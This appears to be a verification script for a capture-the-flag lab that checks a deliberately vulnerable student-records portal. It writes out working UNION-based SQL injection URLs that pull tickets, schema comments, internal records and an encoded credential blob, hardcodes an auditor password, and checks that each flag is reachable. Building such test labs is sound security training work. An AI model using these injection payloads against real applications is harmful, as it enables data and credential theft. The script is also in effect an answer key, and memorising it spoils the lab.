#!/bin/bash
set -euo pipefail

APP_ROOT="/var/www/records-portal"
SOCKET="/run/l2portal/l2portal.sock"
DB_NAME="lphu_records"
BASE=(curl --silent --show-error --unix-socket "${SOCKET}")
fail() { echo "[FAIL] $1"; exit 1; }
ok() { echo "[OK]   $1"; }
http() { "${BASE[@]}" "$@"; }

[ "${EUID}" -eq 0 ] || fail "Run as root: sudo ./verify_level2.sh"
systemctl is-active --quiet postgresql || fail "PostgreSQL is not active"
systemctl is-active --quiet ssh || fail "SSH is not active"
systemctl is-active --quiet level2-records.service || fail "Level 2 service is not active"
ok "required services are active"

[ -S "${SOCKET}" ] || fail "Level 2 Unix socket is missing"
ss -lx | grep -Fq "${SOCKET}" || fail "Level 2 socket is not listening"
sudo -u www-data test ! -r "${APP_ROOT}/portal.py" || fail "www-data can read portal source"
sudo -u heisenberg test ! -r "${APP_ROOT}/portal.py" || fail "heisenberg can read portal source"
sudo -u www-data test ! -x /run/l2portal || fail "www-data can traverse portal socket directory"
ok "source and socket directory boundaries are correct"

# Exercise the socket rather than relying on its file mode. The orientation
# checkpoint is earned only after its three migration-review observations.
ORIENTATION_COOKIES=/tmp/l2-orientation-cookies
rm -f "${ORIENTATION_COOKIES}"
sudo -u heisenberg curl --silent --fail --cookie-jar "${ORIENTATION_COOKIES}" --unix-socket "${SOCKET}" http://lphu/orientation >/tmp/l2-heisenberg-page || fail "heisenberg cannot connect to portal socket"
if sudo -u www-data curl --silent --fail --max-time 3 --unix-socket "${SOCKET}" http://lphu/ >/tmp/l2-www-data-page 2>/dev/null; then
  fail "www-data can connect to portal socket"
fi
ok "only the pivot account can connect to the portal socket"

root_page="$(http http://lphu/)"
grep -q 'LPHU Internal Records Portal' <<<"${root_page}" || fail "portal root did not load"
grep -q 'Registrar system migration notice' /tmp/l2-heisenberg-page || fail "orientation memo missing"
if grep -q 'FLAG2_03{' /tmp/l2-heisenberg-page; then
  fail "orientation exposes its checkpoint before investigation"
fi
normal="$(sudo -u heisenberg curl --silent --fail --cookie "${ORIENTATION_COOKIES}" --unix-socket "${SOCKET}" 'http://lphu/?id=1023')"
grep -q 'Marion Q.' <<<"${normal}" || fail "normal student lookup failed"
missing="$(sudo -u heisenberg curl --silent --fail --cookie "${ORIENTATION_COOKIES}" --unix-socket "${SOCKET}" 'http://lphu/?id=1999')"
grep -q 'No record found' <<<"${missing}" || fail "missing student lookup failed"
malformed="$(sudo -u heisenberg curl --silent --fail --cookie "${ORIENTATION_COOKIES}" --unix-socket "${SOCKET}" 'http://lphu/?id=1023%27')"
grep -q 'Database Error:' <<<"${malformed}" || fail "SQL error surface missing"
orientation_complete="$(sudo -u heisenberg curl --silent --fail --cookie "${ORIENTATION_COOKIES}" --unix-socket "${SOCKET}" 'http://lphu/orientation?review=REG-4488')"
grep -q 'FLAG2_03{' <<<"${orientation_complete}" || fail "orientation checkpoint was not earned after investigation"
ok "orientation memo gates its checkpoint; normal, missing, and unusual lookups work"

ticket="$(http 'http://lphu/?id=-1%20UNION%20SELECT%20id,ticket_ref,state,analyst_note%20FROM%20incident_tickets--')"
grep -q 'FLAG2_04{' <<<"${ticket}" || fail "SQLi checkpoint missing"
metadata="$(http "http://lphu/?id=-1%20UNION%20SELECT%201,obj_description('audit_credentials'::regclass),'metadata','comment'--")"
grep -q 'FLAG2_05{' <<<"${metadata}" || fail "schema metadata checkpoint missing"
record="$(http 'http://lphu/?id=-1%20UNION%20SELECT%20id,type,classification,content%20FROM%20internal_records--')"
grep -q 'FLAG2_06{' <<<"${record}" || fail "internal record checkpoint missing"
creds="$(http 'http://lphu/?id=-1%20UNION%20SELECT%20id,account_hint,credential_blob,note%20FROM%20audit_credentials--')"
grep -q 'YXVkaXRvcj' <<<"${creds}" || fail "encoded audit credential unavailable"
ok "intended SQLi, schema, record, and encoded-credential path works"

unauth_code="$(http -o /tmp/l2-audit-unauth -w '%{http_code}' http://lphu/audit)"
[ "${unauth_code}" = "401" ] || fail "unauthenticated audit returned HTTP ${unauth_code}"
grep -q 'FLAG2_07{' /tmp/l2-audit-unauth || fail "protected-resource checkpoint missing"
auth_code="$(http -u 'auditor:Aud1t_R3v13w_2026!' -o /tmp/l2-audit-auth -w '%{http_code}' http://lphu/audit)"
[ "${auth_code}" = "200" ] || fail "audit credentials did not authenticate"
grep -q 'FLAG2_09{' /tmp/l2-audit-auth || fail "authenticated checkpoint missing"
grep -q 'FLAG2_10{' /tmp/l2-audit-auth || fail "final checkpoint missing"
grep -q 'LOT-74B-SUPERLAB' /tmp/l2-audit-auth || fail "Level 3 handoff missing"
ok "audit protection, authentication, final flag, and handoff work"

sudo -u postgres psql -d "${DB_NAME}" -Atc "SELECT count(*) FROM information_schema.tables WHERE table_schema='public' AND table_name IN ('students','staff','courses','incident_tickets','internal_records','audit_credentials')" | grep -qx 6 || fail "required database tables missing"
sudo -u postgres psql -d "${DB_NAME}" -Atc "SELECT rolsuper OR rolcreatedb OR rolcreaterole FROM pg_roles WHERE rolname='lphu_webapp'" | grep -qx f || fail "database role is overprivileged"
ok "database structure and application role are correct"

if ss -ltn | grep -Eq ':(8080|9090)\b'; then
  fail "unexpected Level 2 TCP listener exists"
fi
ss -ltnp | grep -Eq ':80\b.*apache2' || fail "Apache is no longer serving existing port 80 content"
for file in README.md LEVEL2_PLAYER.md HINTS.md deploy.sh reset_level2.sh; do
  ! grep -q 'FLAG2_' "${file}" || fail "flag exposed in ${file}"
done
flag_count="$( { cat /home/heisenberg/.lphu/ssh-welcome.txt /home/heisenberg/.lphu/registrar-connectivity.txt; sudo -u postgres psql -d "${DB_NAME}" -Atc "SELECT analyst_note FROM incident_tickets UNION ALL SELECT obj_description('audit_credentials'::regclass) UNION ALL SELECT content FROM internal_records"; sudo -u postgres psql -d "${DB_NAME}" -Atc "SELECT credential_blob FROM audit_credentials" | tr -d '[:space:]' | base64 --decode; cat /etc/lphu-level2/*.env; } | grep -oE 'FLAG2_[0-9]{2}\{[^}]+\}' | sort -u | wc -l | tr -d ' ')"
[ "${flag_count}" = "10" ] || fail "expected exactly 10 unique checkpoint flags, found ${flag_count}"
ok "no flags in player material; exactly ten unique checkpoints are deployed"

echo
echo "Level 2 verification: PASS"
